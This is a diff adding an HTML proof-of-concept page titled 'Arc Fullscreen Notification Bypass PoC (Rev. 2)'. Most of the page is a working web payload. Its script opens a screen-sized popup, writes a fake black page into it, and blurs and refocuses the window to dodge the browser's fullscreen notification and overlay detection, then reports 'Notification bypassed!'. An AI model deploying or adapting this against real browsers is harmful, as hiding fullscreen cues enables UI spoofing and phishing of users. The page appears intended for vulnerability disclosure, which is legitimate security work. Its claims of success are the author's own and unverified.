@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Arc Fullscreen Notification Bypass PoC (Rev. 2)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      padding: 50px;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      text-align: center;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    button {
+      padding: 15px 30px;
+      font-size: 18px;
+      background: rgba(255, 255, 255, 0.2);
+      color: white;
+      border: 2px solid rgba(255, 255, 255, 0.5);
+      border-radius: 12px;
+      cursor: pointer;
+      backdrop-filter: blur(10px);
+    }
+    button:hover {
+      background: rgba(255, 255, 255, 0.3);
+    }
+    #status {
+      position: fixed;
+      top: 10px;
+      right: 10px;
+      background: rgba(0, 0, 0, 0.5);
+      color: lime;
+      padding: 10px;
+      border-radius: 8px;
+      font-family: monospace;
+      font-size: 12px;
+    }
+    .fullscreen-content {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100vh;
+      background: #000;
+      color: white;
+      z-index: 9999;
+    }
+    .fullscreen-content.active {
+      display: block;
+    }
+  </style>
+</head>
+<body>
+  <div>
+    <h1>Arc Fullscreen Bypass Demo (Rev. 2)</h1>
+    <p>Click to enter immersive mode without notification</p>
+    <button onclick="bypassFullscreen()">Enter Immersive Mode</button>
+  </div>
+  
+  <div id="status">Status: Ready</div>
+  <div id="fullscreenContent" class="fullscreen-content">
+    <h2>Immersive Content</h2>
+    <p>Address bar hidden - No notification!</p>
+  </div>
+
+  <script>
+    async function bypassFullscreen() {
+      const status = document.getElementById('status');
+      const fullscreenContent = document.getElementById('fullscreenContent');
+      status.textContent = 'Status: Initiating bypass...';
+
+      // Step 1: Open a new window with maximized dimensions (no Fullscreen API)
+      const win = window.open('', '_blank', `width=${screen.availWidth},height=${screen.availHeight},left=0,top=0`);
+      if (!win) {
+        status.textContent = 'Status: Popup blocked - Fallback to current window';
+        return;
+      }
+
+      // Step 2: Inject content with delayed execution to confuse notification timing
+      setTimeout(() => {
+        const fakePage = `
+          <!DOCTYPE html>
+          <html><head>
+            <title>Hidden Page</title>
+            <style>
+              body { margin:0; padding:0; height:100vh; width:100%; background:#000; color:white; overflow:hidden; }
+              #content { position:fixed; top:0; left:0; width:100%; height:100vh; }
+            </style>
+          </head>
+          <body>
+            <div id="content">
+              <h2>Immersive Mode Active</h2>
+              <p>No address bar or notification visible!</p>
+            </div>
+          </body></html>
+        `;
+        win.document.write(fakePage);
+        win.document.close();
+
+        // Step 3: Minimize macOS overlay detection
+        win.blur();
+        setTimeout(() => win.focus(), 100);
+
+        // Step 4: Show content in new window
+        status.textContent = 'Status: Immersive mode entered - Notification bypassed!';
+      }, 500);
+
+      // Step 5: Clean up after 10s (optional)
+      setTimeout(() => {
+        if (win && !win.closed) win.close();
+      }, 10000);
+    }
+  </script>
+</body>
+</html>
